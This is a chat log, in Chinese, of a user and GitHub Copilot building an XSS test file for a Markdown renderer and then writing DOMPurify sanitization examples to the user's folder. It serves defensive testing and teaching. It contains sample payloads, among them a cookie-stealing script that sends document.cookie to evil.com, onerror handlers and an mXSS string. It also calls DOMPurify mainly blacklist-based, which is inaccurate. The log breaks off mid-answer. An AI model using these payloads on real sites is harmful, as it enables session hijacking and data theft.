User: 在当前文件中生成一份测试xss攻击的markdown格式的内容，测试边界覆盖的范围一定要广

GitHub Copilot: 


```

```
已在 test.md 中生成完整的 XSS 攻击测试用例集，覆盖 **17 大类 110+ 个测试向量**，包括：

- **基础注入**：script 标签（大小写混淆、嵌套、注释绕过）
- **事件处理器**：20+ 种标签与事件组合（onerror/onload/onfocus/ontoggle 等）
- **URL 协议**：javascript:/data:/vbscript: 及各种编码变体
- **SVG/MathML**：命名空间相关注入
- **编码绕过**：HTML 实体、Unicode、URL 编码、双重编码、混合编码、空字节
- **CSS 注入**：style/expression/@import
- **嵌入标签**：iframe/object/embed/applet（含 srcdoc）
- **Markdown 特有攻击面**：链接 title 注入、参考式链接、脚注、表格、代码块逃逸
- **Mutation XSS (mXSS)**：解析器差异与命名空间混淆
- **模板注入**：Angular/Vue/Jinja
- **特殊字符**：零宽空格、软连字符、换行回车、BOM、RTL 覆盖

已进行更改。

User: 有些内容你没有按照markdown的格式输出，检查一遍之后，重新输出

GitHub Copilot: 


已创建 1 个待办事项

问题在于大量 XSS payload 直接以原始 HTML 写在 Markdown 中，渲染时会被当作 HTML 解析而非显示为文本。我将所有 payload 用代码块包裹，确保正确展示。 

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md)

文件已存在，我需要用替换的方式重写。由于改动范围太大（几乎全文），我直接清空后重写。 

Ran terminal command:  cat /dev/null > "/未命名文件夹/test.md"

正在将 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md) 中的 1 行替换为 766 行


```

```


已完成: *重写test.md，所有XSS payload用代码块包裹* (1/1)

已修复完成。主要改动：

- **所有裸 HTML payload** 全部用 ` ```html ``` ` 代码块包裹，避免被 Markdown 渲染器解析为真实 HTML
- **Markdown 语法的 payload**（如链接、图片）用 ` ```markdown ``` ` 代码块包裹
- **模板注入**（Angular/Vue/Jinja）用 ` ```text ``` ` 或对应语言标识包裹
- **零宽字符**用 `[U+200B]` 占位符说明，避免不可见字符在 Markdown 中丢失
- **代码块逃逸测试**用四个反引号 ```````` 嵌套包裹，确保正确展示` 代码块包裹，避免被 Markdown 渲染器解析为真实 HTML
- **Markdown 语法的 payload**（如链接、图片）用 ` ```markdown ``` ` 代码块包裹
- **模板注入**（Angular/Vue/Jinja）用 ` ```text ``` ` 或对应语言标识包裹
- **零宽字符**用 `[U+200B]` 占位符说明，避免不可见字符在 Markdown 中丢失
- **代码块逃逸测试**用四个反引号 ```````` 嵌套包裹，确保正确展示

已进行更改。

User: 目前生成的很不错，我想要再加入一些不在代码块中的代码文件和文本内容，请帮我生成

GitHub Copilot: 

  

Ran terminal command:  wc -l "/未命名文件夹/test.md"

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md#1-1)，行 1 到 50

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md#750-750)，行 750 到 765

读取 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md#760-760)，行 760 到 765

现在在文件末尾追加一个新的章节，包含不在代码块中的原始 payload 内容： 

正在将 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/test.md) 中的 2 行替换为 362 行


```

```
已在文件末尾追加了 **附录：裸 Payload 实战测试区**，新增 **A1 ~ A20 共 20 个分类、50+ 条裸 payload**，全部不使用代码块包裹，直接嵌入 Markdown 文档。覆盖范围包括：

- **A1~A3**：裸 script 标签、事件处理器、SVG/MathML
- **A4~A7**：Markdown 链接/图片/参考式链接/自动链接的 javascript:/data: 协议
- **A8~A9**：裸 HTML 属性注入、iframe/object/embed
- **A10~A12**：裸 CSS 注入、表单劫持、meta 标签
- **A13~A14**：编码绕过、Mutation XSS
- **A15**：模板语法（Angular/Vue/Jinja/ERB/ES6 模板字符串）
- **A16**：元素闭合与标签拼接
- **A17~A18**：Markdown 表格内 & 脚注内的裸 payload
- **A19**：混合 Markdown 格式（加粗/斜体/引用/列表）+ 裸 HTML
- **A20**：冷门标签（bgsound/layer/plaintext/xmp/自定义标签等）

已进行更改。

User: 详细回答我 xss攻击是什么？

GitHub Copilot: 

## XSS（Cross-Site Scripting，跨站脚本攻击）

### 定义

XSS 是一种代码注入攻击。攻击者将恶意脚本（通常是 JavaScript）注入到受信任的网站页面中，当其他用户浏览该页面时，恶意脚本在用户浏览器中执行，从而窃取数据或执行恶意操作。

---

### 三种主要类型

#### 1. 反射型 XSS（Reflected XSS）

- 恶意脚本包含在 **URL 参数**中，服务器将其原样"反射"到响应页面
- **不持久**，需要诱骗用户点击特制链接
- 例：`https://example.com/search?q=<script>alert(1)</script>`，服务器把 `q` 的值直接拼进 HTML 返回

#### 2. 存储型 XSS（Stored XSS）

- 恶意脚本被**存入服务器数据库**（如评论、帖子、用户名）
- **持久性**，所有访问该页面的用户都会被攻击
- 危害最大，例：在论坛评论中提交 `<script>document.location='https://evil.com/?c='+document.cookie</script>`

#### 3. DOM 型 XSS（DOM-based XSS）

- 恶意脚本**不经过服务器**，完全在浏览器端通过 JavaScript 操作 DOM 触发
- 例：页面 JS 读取 `location.hash` 并直接写入 `innerHTML`，攻击者构造 `https://example.com/#<img src=x onerror=alert(1)>`

---

### 攻击能做什么

| 危害 | 说明 |
|------|------|
| **窃取 Cookie / Session** | `document.cookie` 发送到攻击者服务器，劫持用户会话 |
| **键盘记录** | 监听 `keydown` 事件，记录用户输入的密码、信用卡号 |
| **钓鱼** | 动态修改页面内容，伪造登录表单骗取凭据 |
| **传播蠕虫** | 自动代表受害者发帖/发消息，形成蠕虫式传播（如 Samy 蠕虫） |
| **挖矿 / DDoS** | 利用受害者浏览器算力挖矿或发起分布式请求 |
| **绕过同源策略** | 因为脚本在目标站点域下执行，可访问该域所有数据 |
| **操作页面** | 重定向、篡改内容、插入广告 |

---

### 攻击原理（核心）

浏览器**无法区分**"网站自身的合法脚本"和"攻击者注入的恶意脚本"。只要 HTML 中出现 `<script>` 或能触发 JS 的属性（`onerror`、`onclick`、`javascript:` 协议等），浏览器就会执行。

```
用户输入 → 未过滤/未转义 → 拼接进 HTML → 浏览器解析执行
```

---

### 常见注入点

1. **URL 参数**：`?name=<script>...`
2. **表单输入**：搜索框、评论框、注册表单
3. **HTTP 头**：Referer、User-Agent 被回显到页面
4. **富文本编辑器**：允许 HTML 的编辑器
5. **第三方数据**：API 返回的未转义内容
6. **文件名**：上传文件名被显示时
7. **Markdown 渲染器**：正是你当前测试的场景

---

### 防御措施

#### 输出编码（最核心）

在不同上下文使用不同编码规则：

| 上下文 | 编码方式 | 示例 |
|--------|---------|------|
| HTML 正文 | HTML 实体编码 | `<` → `&lt;`，`>` → `&gt;`，`"` → `&quot;` |
| HTML 属性 | HTML 属性编码 | 所有非字母数字字符编码为 `&#xHH;` |
| JavaScript | JS 编码 | `\xHH` 或 `\uHHHH` |
| URL | URL 编码 | `%HH` |
| CSS | CSS 编码 | `\HHHHHH` |

#### 输入验证

- 白名单校验（只允许预期格式，如邮箱、数字）
- 拒绝或过滤危险字符

#### CSP（Content Security Policy）

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
```
- 禁止内联脚本执行
- 限制脚本只能从指定域加载
- 即使注入成功，脚本也无法执行

#### HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
- `HttpOnly`：JS 无法读取 Cookie，防止会话劫持
- `SameSite`：防止 CSRF 配合 XSS

#### 使用安全的 API

```javascript
// 危险 — 直接解析 HTML
element.innerHTML = userInput;
document.write(userInput);

// 安全 — 纯文本赋值
element.textContent = userInput;
```

#### HTML 净化库

- **DOMPurify**（前端）
- **Bleach**（Python）
- **sanitize-html**（Node.js）

在允许用户输入 HTML/Markdown 的场景（如你的测试），使用净化库过滤危险标签和属性。

---

### 与你当前测试的关系

你的 test.md 文件覆盖的正是 Markdown 渲染器场景下的 XSS 攻击面。Markdown 渲染器通常会将 Markdown 转为 HTML，如果渲染过程中未正确过滤：

- 裸 `<script>` 标签会被保留
- `javascript:` 协议链接会被渲染为可点击
- 事件属性（`onerror`、`onload`）会被浏览器执行
- SVG/MathML 等命名空间标签可能绕过简单的过滤规则

这就是为什么你的测试文件中既需要代码块展示的 payload（用于文档参考），也需要裸写的 payload（用于实际测试渲染器是否会拦截）。

User: 除了 DOMPurify 这个库之外，还有哪些推荐的xss防御库

GitHub Copilot: 

## XSS 防御库推荐

### 前端（浏览器端）

| 库 | 语言 | 特点 |
|---|------|------|
| **sanitize-html** | JavaScript | 白名单机制，可精细配置允许的标签/属性/CSS，适合富文本场景 |
| **xss** (js-xss) | JavaScript | 轻量，白名单过滤，支持自定义规则，中文社区活跃 |
| **isomorphic-dompurify** | JavaScript | DOMPurify 的同构封装，同时支持 Node.js 和浏览器 |
| **xss-filters** | JavaScript | Yahoo 出品，基于上下文的输出编码（非净化），适合模板插值 |

### Node.js 后端

| 库 | 特点 |
|---|------|
| **sanitize-html** | 同时可用于服务端，npm 周下载量百万级 |
| **xss** (js-xss) | 同上，前后端通用 |
| **helmet** | Express 中间件，设置安全 HTTP 头（CSP、X-XSS-Protection 等），不是净化库但是必备防线 |
| **express-validator** | 内置 `escape()` 方法对输入做 HTML 实体编码 |
| **serialize-javascript** | 安全序列化 JS 对象到 HTML 中，防止 JSON 注入 XSS |

### Python

| 库 | 特点 |
|---|------|
| **Bleach** | Mozilla 出品，基于白名单净化 HTML，配合 html5lib 解析 |
| **nh3** | Rust 编写的 Python 绑定（ammonia 的封装），性能远超 Bleach，Bleach 官方推荐的替代品 |
| **MarkupSafe** | Jinja2 默认使用，自动转义模板变量 |
| **defusedxml** | 防御 XML 相关的注入（XXE、XML bomb） |

### Java

| 库 | 特点 |
|---|------|
| **OWASP Java HTML Sanitizer** | OWASP 官方出品，高性能白名单 HTML 净化 |
| **Jsoup** | HTML 解析器自带 `clean()` 方法，支持白名单净化 |
| **ESAPI** | OWASP 企业安全 API，提供各种上下文编码器（HTML/JS/CSS/URL） |
| **AntiSamy** | OWASP 出品，基于策略文件的 HTML 净化，适合复杂富文本 |

### Go

| 库 | 特点 |
|---|------|
| **bluemonday** | 白名单 HTML 净化，API 简洁，Go 生态首选 |
| **html/template** | 标准库，自动上下文感知转义 |

### Ruby

| 库 | 特点 |
|---|------|
| **Loofah** | Nokogiri 之上的 HTML 净化，Rails 默认依赖 |
| **Rails::Html::Sanitizer** | Rails 内置，底层用 Loofah |
| **Sanitize** | 白名单 HTML 净化，配置灵活 |

### PHP

| 库 | 特点 |
|---|------|
| **HTML Purifier** | PHP 生态最成熟的 HTML 净化库，严格符合标准 |
| **symfony/html-sanitizer** | Symfony 官方组件，基于白名单 |

### Rust

| 库 | 特点 |
|---|------|
| **ammonia** | Rust 原生 HTML 净化库，速度极快，nh3 的底层 |

### .NET

| 库 | 特点 |
|---|------|
| **HtmlSanitizer** | .NET 白名单 HTML 净化，NuGet 上最流行的 XSS 防御库 |
| **AntiXSS (Microsoft.Security.Application)** | 微软出品的编码库 |

---

### 选型建议

1. **富文本/Markdown 渲染** → 用净化库（DOMPurify、sanitize-html、Bleach/nh3）
2. **普通文本输出** → 用编码/转义（MarkupSafe、xss-filters、ESAPI）
3. **HTTP 层防护** → 用中间件设置 CSP 头（helmet、框架内置）
4. **性能敏感** → 优先考虑 Rust 编写的库（ammonia/nh3），比纯脚本语言快 10~100 倍

净化库和输出编码是互补的，最佳实践是**两者结合 + CSP 兜底**。

User: 和 markdown 渲染相关联的库是选择 DOMPurify 还是 sanitize-html？

GitHub Copilot: 

## DOMPurify vs sanitize-html：Markdown 渲染场景对比

### 结论先行

**优先选 DOMPurify**。以下是详细对比：

---

### 核心对比

| 维度 | DOMPurify | sanitize-html |
|------|-----------|---------------|
| **解析方式** | 使用浏览器原生 DOM 解析器 | 用 htmlparser2 自行解析 HTML |
| **安全性** | 极高，利用浏览器引擎解析，和最终渲染行为一致 | 较高，但第三方解析器与浏览器存在解析差异 |
| **mXSS 防御** | 强，专门针对 Mutation XSS 做了处理 | 弱，解析器差异正是 mXSS 的攻击面 |
| **性能** | 快（原生 DOM 操作） | 慢 2~10 倍（纯 JS 解析） |
| **包体积** | ~15KB (minified+gzip) | ~50KB+ (含 htmlparser2) |
| **运行环境** | 浏览器端原生；Node.js 需搭配 jsdom | 浏览器 + Node.js 直接可用 |
| **配置方式** | 黑名单为主（默认安全，移除危险项） | 白名单为主（显式声明允许项） |
| **SVG/MathML** | 原生支持净化 | 不支持，需手动配置或直接剔除 |
| **npm 周下载量** | ~10M+ | ~7M+ |
| **维护活跃度** | 非常活跃，安全漏洞响应快 | 活跃，但安全修复节奏稍慢 |

---

### 为什么 Markdown 渲染场景更适合 DOMPurify

#### 1. 解析一致性

Markdown 渲染器（如 marked、markdown-it）输出 HTML → 交给浏览器渲染。DOMPurify 使用的是**同一个浏览器 DOM 解析器**，净化结果和最终渲染行为完全一致，不存在"净化时看到的结构 ≠ 浏览器实际渲染的结构"的问题。

sanitize-html 用 htmlparser2 解析，它的解析行为和浏览器**不完全一致**，这正是 mXSS 攻击的根源。

#### 2. mXSS 防护

你的测试文件第 16 节的那些 Mutation XSS payload：

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

这类 payload 利用的就是净化器解析和浏览器解析的差异。DOMPurify 专门做了多轮净化来防御 mXSS，sanitize-html 对此基本无能为力。

#### 3. Markdown 常见的输出内容

Markdown 渲染器可能输出 SVG（流程图/公式插件）、MathML（数学公式）、复杂嵌套 HTML。DOMPurify 对这些都有原生支持：

```javascript
DOMPurify.sanitize(html, {
  USE_PROFILES: { html: true, svg: true, mathMl: true }
});
```

sanitize-html 对 SVG/MathML 支持很弱。

---

### sanitize-html 更适合的场景

- **Node.js 服务端净化**（不想引入 jsdom 的开销）
- **需要精细控制白名单**（例如只允许 `<b>`、`<i>`、`<a>` 三个标签）
- **简单富文本编辑器**（只有基础格式，不涉及 SVG/MathML）

---

### 推荐用法（Markdown + DOMPurify）

```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Markdown → HTML → 净化
const rawHtml = marked.parse(userMarkdown);
const cleanHtml = DOMPurify.sanitize(rawHtml, {
  ALLOWED_TAGS: ['h1','h2','h3','h4','h5','h6','p','br','hr',
    'ul','ol','li','blockquote','pre','code',
    'a','img','strong','em','del','table','thead',
    'tbody','tr','th','td','sup','sub','details','summary'],
  ALLOWED_ATTR: ['href','src','alt','title','class','id',
    'target','rel','open'],
  ALLOW_DATA_ATTR: false,
  FORBID_ATTR: ['style','onerror','onload','onclick',
    'onmouseover','onfocus','ontoggle'],
});
```

如果在 Node.js 端：

```javascript
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);
const cleanHtml = purify.sanitize(rawHtml);
```

或者直接用 **isomorphic-dompurify**，省去手动配置 jsdom：

```javascript
import DOMPurify from 'isomorphic-dompurify';
const cleanHtml = DOMPurify.sanitize(rawHtml);
```

---

### 一句话总结

Markdown 渲染 → **DOMPurify**（解析一致、防 mXSS、支持 SVG/MathML）。只在纯 Node.js 且不想装 jsdom 时才考虑 sanitize-html。

User: DOMPurify 和mardown渲染结合使用详细案例

GitHub Copilot: 

## DOMPurify + Markdown 渲染详细案例

---

### 案例 1：最基础用法（浏览器端）

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <title>Markdown + DOMPurify 基础示例</title>
</head>
<body>
  <textarea id="editor" rows="10" cols="60" placeholder="输入 Markdown..."></textarea>
  <button onclick="render()">渲染</button>
  <div id="preview"></div>

  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/dompurify/dist/purify.min.js"></script>
  <script>
    function render() {
      const markdown = document.getElementById('editor').value;

      // 第一步：Markdown → 原始 HTML
      const rawHtml = marked.parse(markdown);

      // 第二步：DOMPurify 净化
      const cleanHtml = DOMPurify.sanitize(rawHtml);

      // 第三步：安全插入 DOM
      document.getElementById('preview').innerHTML = cleanHtml;
    }
  </script>
</body>
</html>
```

用户输入 `<img src=x onerror=alert(1)>` → `marked.parse` 保留原样 → DOMPurify 移除 `onerror` → 最终只剩 `<img src="x">`。

---

### 案例 2：自定义白名单配置

```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// 自定义净化配置
const purifyConfig = {
  // 允许的标签（覆盖 Markdown 常见输出）
  ALLOWED_TAGS: [
    // 标题
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    // 文本块
    'p', 'br', 'hr', 'blockquote', 'pre', 'code',
    // 列表
    'ul', 'ol', 'li',
    // 内联格式
    'strong', 'em', 'del', 's', 'mark', 'sup', 'sub',
    // 链接与图片
    'a', 'img',
    // 表格
    'table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td',
    // 其他
    'details', 'summary', 'kbd', 'abbr',
    // 任务列表
    'input',
  ],

  // 允许的属性
  ALLOWED_ATTR: [
    'href', 'src', 'alt', 'title', 'class', 'id',
    'target', 'rel', 'width', 'height',
    'open',           // <details open>
    'type', 'checked', 'disabled', // <input type="checkbox">
    'align',          // 表格对齐
    'colspan', 'rowspan',
  ],

  // 禁止 data-* 属性
  ALLOW_DATA_ATTR: false,

  // 链接协议白名单（关键！阻止 javascript: 等）
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,

  // 强制所有链接添加 noopener
  ADD_ATTR: ['target'],
};

function renderMarkdown(markdownText) {
  const rawHtml = marked.parse(markdownText);
  return DOMPurify.sanitize(rawHtml, purifyConfig);
}

// 测试
const input = `
# 标题

正常的 [链接](https://example.com) 和 ![图片](https://example.com/img.png)

恶意链接: [点击](javascript:alert('XSS'))

<script>alert('XSS')</script>

<img src=x onerror=alert('XSS')>

| 表头 | 数据 |
|------|------|
| 正常 | <svg onload=alert(1)> |
`;

console.log(renderMarkdown(input));
```

**输出**（已净化）：

```html
<h1>标题</h1>
<p>正常的 <a href="https://example.com">链接</a> 和 <img src="https://example.com/img.png" alt="图片"></p>
<p>恶意链接: <a>点击</a></p>
<!-- script 标签被完全移除 -->
<img src="x">  <!-- onerror 被移除 -->
<table><thead><tr><th>表头</th><th>数据</th></tr></thead>
<tbody><tr><td>正常</td><td></td></tr></tbody></table>  <!-- svg 被移除 -->
```

---

### 案例 3：Hook 机制（链接安全增强）

```javascript
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Hook：所有 <a> 标签强制添加安全属性
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // 外部链接处理
  if (node.tagName === 'A') {
    const href = node.getAttribute('href') || '';

    // 外部链接：添加 noopener noreferrer + 新窗口打开
    if (href.startsWith('http') && !href.includes(location.hostname)) {
      node.setAttribute('target', '_blank');
      node.setAttribute('rel', 'noopener noreferrer');
    }

    // 二次校验：移除非法协议链接
    if (/^(javascript|data|vbscript):/i.test(href.replace(/\s/g, ''))) {
      node.removeAttribute('href');
    }
  }

  // 图片：禁止非 https 图片
  if (node.tagName === 'IMG') {
    const src = node.getAttribute('src') || '';
    if (!src.startsWith('https://')) {
      node.removeAttribute('src');
      node.setAttribute('alt', '[图片已被安全策略拦截]');
    }
  }
});

// Hook：移除所有危险的 style 属性内容
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (data.attrName === 'style') {
    // 移除 expression()、url()、behavior 等
    data.attrValue = data.attrValue
      .replace(/expression\s*\(/gi, '')
      .replace(/url\s*\(/gi, '')
      .replace(/behavior\s*:/gi, '')
      .replace(/-moz-binding\s*:/gi, '');
  }
});

function renderMarkdown(md) {
  return DOMPurify.sanitize(marked.parse(md));
}
```

---

### 案例 4：Node.js 服务端（SSR / API）

```javascript
// server.js
import express from 'express';
import { marked } from 'marked';
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window);

const app = express();
app.use(express.json());

// API：接收 Markdown，返回安全 HTML
app.post('/api/render', (req, res) => {
  const { markdown } = req.body;

  if (typeof markdown !== 'string') {
    return res.status(400).json({ error: '无效输入' });
  }

  // 限制输入长度
  if (markdown.length > 100000) {
    return res.status(400).json({ error: '内容过长' });
  }

  const rawHtml = marked.parse(markdown);
  const cleanHtml = purify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['h1','h2','h3','h4','h5','h6','p','br','hr',
      'ul','ol','li','blockquote','pre','code','a','img',
      'strong','em','del','table','thead','tbody','tr','th','td'],
    ALLOWED_ATTR: ['href','src','alt','title','class'],
    ALLOW_DATA_ATTR: false,
  });

  res.json({ html: cleanHtml });
});

app.listen(3000);
```

或者用 **isomorphic-dompurify** 省去 jsdom：

```javascript
import DOMPurify from 'isomorphic-dompurify';
import { marked } from 'marked';

// 直接使用，不需要 jsdom
const cleanHtml = DOMPurify.sanitize(marked.parse(markdown));
```

---

### 案例 5：配合 markdown-it（代码高亮 + 净化）

```javascript
import MarkdownIt from 'markdown-it';
import hljs from 'highlight.js';
import DOMPurify from 'dompurify';

// markdown-it 配置代码高亮
const md = new MarkdownIt({
  html: false,        // 关键：先在解析层禁用原始 HTML
  linkify: true,
  typographer: true,
  highlight(str, lang) {
    if (lang && hljs.getLanguage(lang)) {
      return hljs.highlight(str, { language: lang }).value;
    }
    return '';
  },
});

// DOMPurify 配置：允许高亮相关的 class
const purifyConfig = {
  ALLOWED_TAGS: [
    'h1','h2','h3','h4','h5','h6','p','br','hr',
    'ul','ol','li','blockquote','pre','code','a','img',
    'strong','em','del','s','mark',
    'table','thead','tbody','tr','th','td',
    // 代码高亮会生成 <span>
    'span',
  ],
  ALLOWED_ATTR: ['href','src','alt','title','class'],
  // 只允许 hljs- 开头的 class
  ALLOW_ARIA_ATTR: false,
  ALLOW_DATA_ATTR: false,
};

// 净化后再二次校验 class 名称
DOMPurify.addHook('uponSanitizeAttribute', (node, data) => {
  if (data.attrName === 'class') {
    // 只保留 hljs 相关和 language- 开头的 class
    const classes = data.attrValue.split(/\s+/);
    data.attrValue = classes
      .filter(c => c.startsWith('hljs') || c.startsWith('language-'))
      .join(' ');
  }
});

function renderMarkdown(markdownText) {
  const rawHtml = md.render(markdownText);
  return DOMPurify.sanitize(rawHtml, purifyConfig);
}
```

---

### 案例 6：React 组件封装

```jsx
import { useMemo } from 'react';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

const PURIFY_CONFIG = {
  ALLOWED_TAGS: [
    'h1','h2','h3','h4','h5','h6','p','br','hr',
    'ul','ol','li','blockquote','pre','code','span',
    'a','img','strong','em','del','table','thead',
    'tbody','tr','th','td','details','summary','input',
  ],
  ALLOWED_ATTR: [
    'href','src','alt','title','class','id',
    'target','rel','open','type','checked','disabled',
  ],
  ALLOW_DATA_ATTR: false,
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
};

// 初始化 Hook（只执行一次）
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

function MarkdownPreview({ content }) {
  const safeHtml = useMemo(() => {
    if (!content) return '';
    const rawHtml = marked.parse(content);
    return DOMPurify.sanitize(rawHtml, PURIFY_CONFIG);
  }, [content]);

  return (
    <div
      className="markdown-body"
      dangerouslySetInnerHTML={{ __html: safeHtml }}
    />
  );
}

export default MarkdownPreview;
```

```jsx
// 使用
<MarkdownPreview content="# Hello\n\n<script>alert(1)</script>" />
```

---

### 案例 7：Vue 3 组件封装

```vue
<template>
  <div class="markdown-body" v-html="safeHtml"></div>
</template>

<script setup>
import { computed } from 'vue';
import { marked } from 'marked';
import DOMPurify from 'dompurify';

const props = defineProps({
  content: { type: String, default: '' },
});

const purifyConfig = {
  ALLOWED_TAGS: [
    'h1','h2','h3','h4','h5','h6','p','br','hr',
    'ul','ol','li','blockquote','pre','code','span',
    'a','img','strong','em','del',
    'table','thead','tbody','tr','th','td',
  ],
  ALLOWED_ATTR: ['href','src','alt','title','class','target','rel'],
  ALLOW_DATA_ATTR: false,
};

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

const safeHtml = computed(() => {
  if (!props.content) return '';
  return DOMPurify.sanitize(marked.parse(props.content), purifyConfig);
});
</script>
```

---

### 处理流程总结

```
用户输入 Markdown
       │
       ▼
┌──────────────────┐
│  markdown-it     │  第 1 层：html: false 禁用原始 HTML（可选）
│  / marked        │
└──────┬───────────┘
       │ 原始 HTML
       ▼
┌──────────────────┐
│  DOMPurify       │  第 2 层：净化 HTML（必须）
│  .sanitize()     │  - 移除 <script>、事件属性
│                  │  - 阻止 javascript: 协议
│                  │  - 防御 mXSS
└──────┬───────────┘
       │ 安全 HTML
       ▼
┌──────────────────┐
│  CSP 头          │  第 3 层：浏览器兜底（推荐）
│  script-src      │  即使前两层漏了，浏览器也拒绝执行
│  'self'          │
└──────────────────┘
```

三层防御，**DOMPurify 是核心**，markdown 解析层和 CSP 是加固。

找到具有 1 个许可证类型的类似代码

User: 把你刚才所有的案例代码写到当前文件夹中

GitHub Copilot: 

 

已创建 7 个待办事项

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case1-basic.html)

正在启动: *创建案例2: 自定义白名单配置* (2/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case2-whitelist.js)

正在启动: *创建案例3: Hook安全增强* (3/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case3-hooks.js)

正在启动: *创建案例4: Node.js服务端* (4/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case4-server.js)

正在启动: *创建案例5: markdown-it+高亮* (5/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case5-markdown-it-highlight.js)

正在启动: *创建案例6: React组件* (6/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case6-react/MarkdownPreview.jsx)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case6-react/App.jsx)

正在启动: *创建案例7: Vue3组件* (7/7)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case7-vue/MarkdownPreview.vue)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case7-vue/App.vue)

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/package.json)

已完成: *创建案例7: Vue3组件* (7/7)

全部创建完成，文件结构如下：

```
├── case1-basic.html                    # 案例1：浏览器直接打开即用
├── case2-whitelist.js                  # 案例2：自定义白名单配置
├── case3-hooks.js                      # 案例3：Hook 安全增强
├── case4-server.js                     # 案例4：Node.js Express 服务端
├── case5-markdown-it-highlight.js      # 案例5：markdown-it + 代码高亮
├── case6-react/
│   ├── MarkdownPreview.jsx             # 案例6：React 组件
│   └── App.jsx                         # React 使用示例
├── case7-vue/
│   ├── MarkdownPreview.vue             # 案例7：Vue 3 组件
│   └── App.vue                         # Vue 使用示例
└── package.json                        # 依赖声明
```

使用方式：
- **案例 1**：直接浏览器打开 case1-basic.html，无需安装依赖
- **案例 2/3/5**：`npm install` 后作为模块导入使用
- **案例 4**：`npm install && node case4-server.js`，然后访问 `http://localhost:3000`
- **案例 6/7**：需在各自的 React/Vue 项目中引入对应组件

已进行更改。

User: 在 xss防御 和markdown渲染结合的场景中，如果用户在markdown的代码块中故意写了一些xss攻击的脚本，但是我再预览markdown的过程中还想要能够正常预览这个攻击脚本内容，我该怎么做呢？

GitHub Copilot: 

## 核心问题

Markdown 代码块里的 XSS 脚本应该**原样显示为文本**，而不是被执行，也不是被 DOMPurify 删掉。

这其实是两个问题的冲突：

1. DOMPurify 净化时会把 `<pre><code><script>alert(1)</script></code></pre>` 中的 `<script>` 也删掉
2. 但代码块里的内容本该以纯文本展示

---

### 关键原理

Markdown 解析器（marked / markdown-it）在处理代码块时，**会自动将 `<` 转义为 `&lt;`**，所以输出的 HTML 是：

```html
<pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
```

这已经是安全的了——浏览器不会执行 `&lt;script&gt;`。

**问题出在**：如果你配置了 `marked` 的 `html: true`（允许原始 HTML），或者 DOMPurify 的配置不当，才会导致代码块内容被破坏。

---

### 正确做法

```
用户输入            Markdown 解析器           DOMPurify            浏览器
                   (marked/markdown-it)
                   
代码块内的 XSS  →  自动转义为 &lt; &gt;  →  不受影响（已是文本）→  显示为文本 ✓
代码块外的 XSS  →  保留原始 HTML        →  被净化移除          →  安全 ✓
```

关键是**先让 Markdown 解析器处理代码块转义，再用 DOMPurify 净化非代码块的部分**。

下面给你写一个完整的示例： 

已创建 [](%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6%E5%A4%B9/case8-codeblock-safe-preview.html)

直接浏览器打开 case8-codeblock-safe-preview.html 即可看到效果。

---

### 核心原理

